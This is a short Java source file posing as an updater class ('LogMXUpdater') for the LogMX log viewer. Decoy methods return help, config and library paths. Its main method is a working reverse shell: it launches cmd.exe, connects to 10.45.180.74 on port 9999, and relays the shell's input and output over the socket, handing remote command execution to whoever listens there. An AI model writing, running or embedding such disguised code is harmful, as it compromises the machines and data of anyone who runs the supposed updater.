// Not sure where I originally got this from. 
package com.lightysoft.logmx;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class LogMXUpdater{

  private static String a = null;
  public static void mainMX(String[] paramArrayOfString){
    String host="10.45.180.74";
  }
  public static void main(String[] paramArrayOfString) throws Exception
  {
    String host="10.45.180.74";
    int port=9999;
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()) {
      while(pi.available()>0)
        so.write(pi.read());
      while(pe.available()>0)
        so.write(pe.read());
      while(si.available()>0)
        po.write(si.read());
      so.flush();
      po.flush();
      Thread.sleep(50);
      try {
        p.exitValue();
        break;
      }
      catch (Exception e){
      }
    };
    p.destroy();
    s.close();
  }
  
  public static String a()
  {
    return a;
  }
  
  public static String b()
  {
    return a + "help/";
  }
  
  public static String c()
  {
    return a + "config/";
  }
  
  public static String d()
  {
    return a + "lib/";
  }
  
  public static String e()
  {
    return a + "samples/";
  }
  
  public static String f()
  {
    return a + "sounds/";
  }
  
  public static String g()
  {
    return a + "parsers/";
  }
}
